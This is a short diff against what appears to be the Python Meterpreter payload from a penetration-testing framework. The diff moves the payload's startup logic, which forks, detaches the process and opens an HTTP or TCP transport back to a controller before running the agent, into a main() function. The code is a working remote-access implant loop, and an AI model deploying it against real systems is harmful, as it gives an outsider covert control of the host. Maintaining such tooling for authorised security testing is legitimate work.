@@ -1264,19 +1264,24 @@ class PythonMeterpreter(object):
         resp += tlv_pack(reqid_tlv)
         return tlv_pack_response(result, resp)
 
-_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
-if not _try_to_fork or (_try_to_fork and os.fork() == 0):
-    if hasattr(os, 'setsid'):
-        try:
-            os.setsid()
-        except OSError:
-            pass
-    if HTTP_CONNECTION_URL and has_urllib:
-        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
-                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
-    else:
-        # PATCH-SETUP-STAGELESS-TCP-SOCKET #
-        transport = TcpTransport.from_socket(s)
-    met = PythonMeterpreter(transport)
-    # PATCH-SETUP-TRANSPORTS #
-    met.run()
+
+def main():
+    _try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
+    if not _try_to_fork or (_try_to_fork and os.fork() == 0):
+        if hasattr(os, 'setsid'):
+            try:
+                os.setsid()
+            except OSError:
+                pass
+        if HTTP_CONNECTION_URL and has_urllib:
+            transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
+                    http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
+        else:
+            # PATCH-SETUP-STAGELESS-TCP-SOCKET #
+            transport = TcpTransport.from_socket(s)
+        met = PythonMeterpreter(transport)
+        # PATCH-SETUP-TRANSPORTS #
+        met.run()
+
+if __name__ == "__main__":
+    main()
